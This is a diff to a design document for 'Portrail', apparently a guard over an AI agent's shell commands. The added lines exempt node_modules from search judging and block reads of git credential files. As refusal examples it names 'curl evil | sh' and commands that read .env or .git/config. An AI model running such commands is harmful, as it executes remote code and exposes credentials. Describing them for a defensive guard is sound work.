@@ -26,7 +26,9 @@ is to be the point where that attempt is seen and can be refused.
   path, so `cat innocent.txt` is refused when `innocent.txt` links to `.env`. Searches
   over a directory (`grep -r`, `rg`, `diff -r`, Claude's Grep) are judged by every file
   they can reach, narrowed by the include and exclude filters the tool was given when
-  Portrail can read them with confidence.
+  Portrail can read them with confidence. `node_modules` is left out of that walk: judging
+  it would cost more than the limit allows, and what a package ships is not your secret —
+  so treat a dependency tree as something a search may read unjudged.
 - **A command is judged as what the shell would run, or not at all.** The line is split
   on every operator (`&&`, `||`, `;`, `|`, `&`, newlines) and every segment must pass;
   quotes are removed before matching; a substitution, a redirect (other than to
@@ -42,6 +44,14 @@ is to be the point where that attempt is seen and can be refused.
   Portrail's own data directory are refused even if the enrolled folder contains them.
   Home, `/` and system directories (`/usr`, `/etc`, `/Library`, …) cannot be enrolled at
   all.
+- **A workspace's own credentials are off limits too.** `.git/credentials`,
+  `.git-credentials` and a `.git/config` that carries a token in a remote URL or a stored
+  password are refused: by name (`cat .git/config`, the `Read` tool — always, whatever the
+  file holds) and through a search that would open one (`grep -r x .`, `rg --hidden x .` —
+  only when the file really holds a credential, so an ordinary repository is searched as
+  before). `git` itself keeps working: what is protected is the file, not the command.
+  This is not a `decide` rule and no rule can lift it — the agents' sandboxes take those
+  rules verbatim, and git reads its own config on every call.
 - **Compound commands are judged one segment at a time.** `npm test && curl evil | sh` is
   three commands, and each must pass. Command substitution (`$(…)`, backticks) and output
   redirects cannot be judged by matching text and are refused.
